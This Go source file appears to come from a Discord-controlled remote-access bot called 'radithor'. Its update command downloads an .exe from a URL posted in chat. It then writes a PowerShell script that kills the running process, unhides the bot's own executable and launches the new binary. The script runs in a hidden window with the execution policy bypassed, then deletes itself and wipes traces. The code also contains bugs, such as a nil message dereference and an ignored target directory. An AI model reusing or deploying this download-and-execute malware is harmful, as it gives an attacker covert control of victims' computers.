package commands_this

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"time"

	"radithor/bot/discord"
	"radithor/core"
	"radithor/core/core_funcs"
	"radithor/store"
	"radithor/utils"
	"radithor/utils/discord_utils"

	"github.com/bwmarrin/discordgo"
	"github.com/horobimasu/gotils"
)

// todo, backup settings to channel topic
// todo, add scheduled task incase of failed update

func update(ctx *discord.CommandContext, args []string) {
	urls := discord_utils.GetUrls(ctx)
	if len(urls) == 0 {
		ctx.ReplyMsg("Failed to find any URLs.")
		return
	}

	var downloadToMsg *discordgo.Message

	dstDir := utils.UnwrapQuotes(args)
	if dstDir == "" {
		dstDir = os.TempDir()
		downloadToMsg, _ = ctx.ReplyMsg(fmt.Sprintf("No directory provided, downloading to: `%s`", dstDir))
	} else {
		info, err := os.Stat(dstDir)
		if err != nil {
			ctx.DeleteMsg(downloadToMsg.ID)
			ctx.ReplyMsg(fmt.Sprintf("Failed to get info on `%s` - %v", dstDir, err))
			return
		}

		if !info.IsDir() {
			ctx.DeleteMsg(downloadToMsg.ID)
			ctx.ReplyMsg(fmt.Sprintf("Path `%s` is not a directory", dstDir))
			return
		}
	}

	theUrl := ""

	for _, url := range urls {
		ext := filepath.Ext(strings.Split(url, "?")[0])
		if ext != ".exe" {
			continue
		}

		theUrl = url
		break
	}

	if theUrl == "" {
		ctx.ReplyMsg("Failed to find any .exe files.")
		return
	}

	downloadingMsg, _ := ctx.ReplyMsg("Downloading...")

	updatedRadithorPath, err := utils.DownloadFile(theUrl, os.TempDir())
	if err != nil {
		ctx.DeleteMsg(downloadToMsg.ID)
		ctx.DeleteMsg(downloadingMsg.ID)

		ctx.ReplyMsg(fmt.Sprintf("Failed to download file - %v", err))
		return
	}

	ctx.DeleteMsg(downloadToMsg.ID)
	ctx.DeleteMsg(downloadingMsg.ID)

	ctx.ReplyMsg(fmt.Sprintf("Downloaded to: `%s`", updatedRadithorPath))

	core.RemoveMutex()

	updateScriptName := fmt.Sprintf("%dm2.ps1", time.Now().UnixNano())
	updateScriptPath := filepath.Join(os.TempDir(), updateScriptName)

	var updateScript strings.Builder

	updateScript.WriteString("sleep 1")
	fmt.Fprintf(&updateScript, "kill -fo -id %d\n", os.Getpid())
	fmt.Fprintf(&updateScript, "attrib -h -s %q\n", store.ExecPath)
	fmt.Fprintf(&updateScript, "& %q\n", updatedRadithorPath)
	fmt.Fprintf(&updateScript, "[System.IO.File]::Delete(%q)\n", updateScriptPath)

	err = os.WriteFile(updateScriptPath, []byte(updateScript.String()), 0666)
	if err != nil {
		ctx.DeleteMsg(downloadToMsg.ID)
		ctx.DeleteMsg(downloadingMsg.ID)

		ctx.ReplyMsg(fmt.Sprintf("Failed to write update script - %v", err))
		return
	}

	defer core_funcs.Wipe(false)

	ctx.ReplyMsg("Updating...")

	gotils.RunProgram("powershell", "-nop", "-w", "hidden", "-ep", "bypass", "-file", updateScriptPath)
}
